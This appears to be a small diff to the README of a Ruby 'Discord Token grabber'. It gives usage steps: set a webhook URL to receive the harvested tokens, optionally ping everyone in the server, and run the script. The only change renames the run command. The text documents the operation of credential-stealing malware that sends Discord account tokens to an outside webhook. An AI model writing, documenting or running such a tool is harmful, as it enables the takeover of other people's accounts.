@@ -8,7 +8,7 @@ The Discord Token grabber is a simple Ruby script that searches for tokens in va
 # Usage
 - Replace the webhook_url variable with the actual webhook URL you want to send the tokens to.
 - Set the ping_me variable to true if you want to mention everyone in the Discord server, or false otherwise.
-- Run the script by executing ruby token_extractor.rb in the project directory.
+- Run the script by executing `ruby tokengrabber.rb` in the project directory.
 
 # Dependencies
 The script requires the following gems to be installed:
